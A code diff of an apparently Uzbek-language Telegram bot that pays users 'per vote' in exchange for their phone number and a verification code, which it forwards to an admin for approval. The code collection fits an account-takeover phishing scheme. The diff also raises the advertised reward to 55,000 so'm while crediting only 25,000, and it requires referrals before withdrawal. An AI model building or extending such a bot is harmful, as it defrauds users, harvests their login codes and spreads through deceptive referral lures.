@@ -293,7 +293,7 @@ async def start(message: types.Message):
             user_states[telegram_id] = "waiting_phone"
             await message.answer(
                 f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
-                f"💰 <b>1 OVOZ = 20 000 SO'M</b>\n\n"
+                f"💰 <b>1 OVOZ = 55 000 SO'M</b>\n\n"
                 f"🔥 <b>HOZIROQ OVOZ BERING!</b>\n\n"
                 f"📝 <b>Qanday ishlaydi:</b>\n"
                 f"1️⃣ Telefon raqamingizni yuboring\n"
@@ -316,7 +316,7 @@ async def start(message: types.Message):
                 f"💰 <b>Balans:</b> {user['balance']:,} so'm\n"
                 f"👥 <b>Referallar soni:</b> {referal_count}\n"
                 f"🔗 <b>Referal link:</b> {referal_link}\n\n"
-                f"🎁 <b>Yana ovoz bering va yana 20 000 so'm oling!</b>\n\n"
+                f"🎁 <b>Yana ovoz bering va yana 55 000 so'm oling!</b>\n\n"
                 f"👇 Pastdagi tugmalardan foydalaning:",
                 reply_markup=user_menu,
                 parse_mode="HTML"
@@ -340,7 +340,7 @@ async def vote_start(message: types.Message):
     user_states[telegram_id] = "waiting_phone"
     await message.answer(
         f"🗳️ <b>OVOZ BERISH</b>\n\n"
-        f"💰 1 ta ovoz = 20 000 so'm\n\n"
+        f"💰 1 ta ovoz = 55 000 so'm\n\n"
         f"📱 Telefon raqamingizni yuboring:\n"
         f"(Kontakt tugmasi yoki qo'lda yozing)",
         reply_markup=phone_keyboard,
@@ -479,7 +479,7 @@ async def receive_code(message: types.Message):
         keyboard = InlineKeyboardMarkup(
             inline_keyboard=[
                 [
-                    InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
+                    InlineKeyboardButton(text="✅ To'g'ri kod (+25 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
                     InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
                 ]
             ]
@@ -566,7 +566,7 @@ async def admin_action(callback: types.CallbackQuery):
                     f"🆔 ID: {telegram_id}\n"
                     f"📞 Tel: {phone}\n"
                     f"🔑 Kod: {code}\n"
-                    f"💰 +20 000 so'm",
+                    f"💰 +25 000 so'm",
                     parse_mode="HTML"
                 )
                 await callback.answer("✅ Tasdiqlandi!")
@@ -654,7 +654,7 @@ async def show_balance(message: types.Message):
             f"💰 Balans: {user['balance']:,} so'm\n"
             f"👥 Referallar: {user['referal_count']}/2\n\n"
             f"💸 Yechish uchun:\n"
-            f"• Balans: 20 000+ so'm\n"
+            f"• Balans: 25 000+ so'm\n"
             f"• Referallar: 2+ ta",
             reply_markup=user_menu,
             parse_mode="HTML"
@@ -698,11 +698,11 @@ async def withdraw_start(message: types.Message):
         referal_count = user['referal_count']
         
         # TEKSHIRISHLAR
-        if balance < 20000:
+        if balance < 25000:
             await message.answer(
                 f"❌ Balans: {balance:,} so'm\n"
-                f"💰 Yechish uchun kamida 20 000 so'm kerak!\n"
-                f"Yana {20000 - balance:,} so'm kerak.\n\n"
+                f"💰 Yechish uchun kamida 25 000 so'm kerak!\n"
+                f"Yana {25000 - balance:,} so'm kerak.\n\n"
                 f"🗳️ Ovoz berish tugmasini bosing!",
                 reply_markup=user_menu
             )
